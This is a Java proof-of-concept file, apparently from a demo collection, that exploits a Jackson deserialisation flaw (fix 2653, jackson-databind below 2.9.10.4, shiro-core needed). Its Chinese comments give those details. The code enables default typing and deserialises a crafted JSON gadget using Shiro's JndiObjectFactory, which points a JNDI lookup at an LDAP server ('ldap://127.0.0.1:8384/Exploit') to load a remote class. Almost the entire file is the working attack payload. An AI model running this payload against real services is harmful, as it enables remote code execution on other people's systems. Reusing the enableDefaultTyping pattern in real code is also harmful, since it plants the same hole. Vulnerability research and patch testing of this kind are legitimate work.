package me.mole.jackson.demo;

import com.fasterxml.jackson.databind.ObjectMapper;

/**
 * jackson官方修复编号：jackson-databind-2653,
 * 影响范围：jackson-databind < 2.9.10.4
 * 条件：项目中依赖 shiro-core 这个jar
 */
public class Jackson2653 {
    public static void main(String[] args) {
        try {
            ObjectMapper mapper = new ObjectMapper();
            mapper.enableDefaultTyping();
            String jsonStr = "[\"org.apache.shiro.jndi.JndiObjectFactory\",{\"resourceName\":\"ldap://127.0.0.1:8384/Exploit\"}]";
            Object obj = mapper.readValue(jsonStr, Object.class);
            mapper.writeValueAsString(obj);
        } catch (Exception e) {
            e.printStackTrace();
        }
    }
}
